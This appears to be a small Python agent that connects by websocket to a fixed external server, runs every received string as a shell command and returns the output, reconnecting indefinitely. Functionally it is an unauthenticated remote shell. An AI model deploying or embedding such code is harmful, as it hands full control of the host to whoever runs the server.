import asyncio
import websockets
import subprocess

SERVER_URL = "wss://projectalphaapi.koushik.us/api/v1/ws"
AGENT_ID = "da88a2a1-198d-4283-8fb9-5c2274f01e6a"

async def handle_command(command):
    try:
        print(f"Executing command: {command}")
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}"

async def connect_to_server():
    uri = f"{SERVER_URL}/{AGENT_ID}"
    async with websockets.connect(uri) as websocket:
        print(f"Connected to server at {uri}")
        while True:
            try:
                command = await websocket.recv()
                print(f"Received command: {command}")
                result = await handle_command(command)
                print(f"Sending result: {result}")
                await websocket.send(result)
            except websockets.ConnectionClosed:
                print("Connection closed. Reconnecting...")
                break

async def main():
    while True:
        try:
            await connect_to_server()
        except Exception as e:
            print(f"Error: {e}. Retrying in 5 seconds...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
